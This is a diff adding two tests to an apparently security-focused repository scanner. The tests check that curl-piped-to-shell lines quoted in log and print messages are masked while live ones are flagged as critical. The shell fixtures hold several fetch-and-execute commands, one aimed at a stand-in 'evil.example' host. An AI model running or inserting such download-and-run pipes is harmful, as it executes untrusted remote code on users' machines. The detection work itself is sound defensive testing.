@@ -862,6 +862,35 @@ describe('scanRepo', () => {
     expect(hits.find((f) => f.file === '.pre-commit-config.yaml')).toBeUndefined();
   });
 
+  it('masks curl|sh text in print/log-helper message strings, keeps run-wrapper and real pipes live (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'hints.sh'),
+      '#!/bin/sh\ninfo "For K3s:"\ninfo "  curl -sfL https://get.k3s.io | sh"\npreflight_strict_warn_or_fail "curl not found (k3s install uses curl|sh; install curl first)"\n',
+    );
+    fs.writeFileSync(
+      path.join(dir, 'mixed.sh'),
+      '#!/bin/sh\nlog_warn "  curl -sfL https://get.k3s.io | sh"\ncurl -fsSL https://real.example/install.sh | bash\n',
+    );
+    fs.writeFileSync(path.join(dir, 'wrap.sh'), "#!/bin/sh\nrun 'curl -sSL https://evil.example/x.sh | bash'\n");
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001' && /pipes a remote download/.test(f.message));
+    expect(hits.find((f) => f.file === 'hints.sh')).toBeUndefined();
+    const mixed = hits.find((f) => f.file === 'mixed.sh')!;
+    expect(mixed.severity).toBe('critical');
+    expect(mixed.line).toBe(3);
+    expect(hits.find((f) => f.file === 'wrap.sh')!.severity).toBe('critical');
+  });
+
+  it('masks multi-line print-helper messages with command substitutions, attributing the finding to the real pipe (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'bootstrap.sh'),
+      '#!/bin/bash\nfail "The login asks its questions on the terminal itself.\n\nRun this yourself, then run this script again:\n  curl -fsSL $SCRIPT_URL | bash\n\n$(login_note)"\ncurl -fsSL https://bun.example/install | bash\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001' && /pipes a remote download/.test(f.message));
+    const hit = hits.find((f) => f.file === 'bootstrap.sh')!;
+    expect(hit.severity).toBe('critical');
+    expect(hit.line).toBe(8);
+  });
+
   it('downgrades injection patterns quoted in inline code spans (AG-SK-001)', () => {
     fs.mkdirSync(path.join(dir, 'skills', 'taste'), { recursive: true });
     fs.writeFileSync(
